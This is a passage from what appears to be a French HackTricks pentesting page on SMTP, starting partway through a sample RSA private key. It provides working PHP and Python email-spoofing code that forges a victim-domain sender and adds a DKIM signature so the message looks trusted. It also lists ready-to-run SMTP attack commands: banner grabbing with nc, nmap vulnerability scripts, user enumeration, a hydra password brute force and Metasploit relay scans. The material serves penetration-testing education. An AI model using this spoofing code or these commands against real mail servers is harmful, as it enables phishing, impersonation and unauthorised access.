Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
-----END RSA PRIVATE KEY-----
```
{% hint %}

**Ou vous pouvez le faire manuellement:**

{% tabs %}
{% tab title="PHP" %}
<pre class="language-php"><code class="lang-php"><strong># Cela enverra un message non sign√©
</strong><strong>mail("votre_email@gmail.com", "Sujet de test!", "hey! Ceci est un test", "De: administrateur@victime.com");
</strong></code></pre>
{% endtab %}

{% tab title="Python" %}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
	<body>
		<h3>This is a test, not a scam</h3>
		<br />
	</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
    dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{% endtab %}
{% endtabs %}

### **Plus d'informations**

**Trouvez plus d'informations sur ces protections dans** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **Autres indicateurs de phishing**

* L'√¢ge du domaine
* Des liens pointant vers des adresses IP
* Des techniques de manipulation de liens
* Des pi√®ces jointes suspectes (inhabituelles)
* Un contenu d'email corrompu
* Des valeurs utilis√©es diff√©rentes de celles des en-t√™tes de courrier
* L'existence d'un certificat SSL valide et fiable
* La soumission de la page √† des sites de filtrage de contenu Web

## Exfiltration via SMTP

**Si vous pouvez envoyer des donn√©es via SMTP** [**lisez ceci**](../../generic-methodologies-and-resources/exfiltration.md#smtp)**.**

## Fichier de configuration

### Postfix

G√©n√©ralement, si install√©, dans `/etc/postfix/master.cf` contient des **scripts √† ex√©cuter** lorsque, par exemple, un nouvel e-mail est re√ßu par un utilisateur. Par exemple, la ligne `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` signifie que `/etc/postfix/filtering` sera ex√©cut√© si un nouvel e-mail est re√ßu par l'utilisateur mark.

Autres fichiers de configuration:
```
sendmail.cf
submit.cf
```
## Commandes Automatiques HackTricks
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for SMTP
  Note: |
    SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

    https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
  Name: Banner Grab
  Description: Grab SMTP Banner
  Command: nc -vn {IP} 25

Entry_3:
  Name: SMTP Vuln Scan
  Description: SMTP Vuln Scan With Nmap
  Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
  Name: SMTP User Enum
  Description: Enumerate uses with smtp-user-enum
  Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
  Name: SMTPS Connect
  Description: Attempt to connect to SMTPS two different ways
  Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
  Name: Find MX Servers
  Description: Find MX servers of an organization
  Command: dig +short mx {Domain_Name}

Entry_7:
  Name: Hydra Brute Force
  Description: Need Nothing
  Command: hydra -P {Big_Passwordlist} {IP} smtp -V
  
Entry_8:
  Name: consolesless mfs enumeration
  Description: SMTP enumeration without the need to run msfconsole
  Note: sourced from https://github.com/carlospolop/legion
  Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit' 
    
```
<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference est un √©v√©nement international de cybers√©curit√©**](https://www.dragonjarcon.org/) qui a lieu depuis plus d'une d√©cennie et se tiendra les 7 et 8 septembre 2023 √† Bogot√°, en Colombie. C'est un √©v√©nement de grande qualit√© technique o√π les derni√®res recherches en espagnol sont pr√©sent√©es, attirant des hackers et des chercheurs du monde entier.\
Inscrivez-vous d√®s maintenant en suivant le lien ci-dessous et ne manquez pas cette grande conf√©rence ! :

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
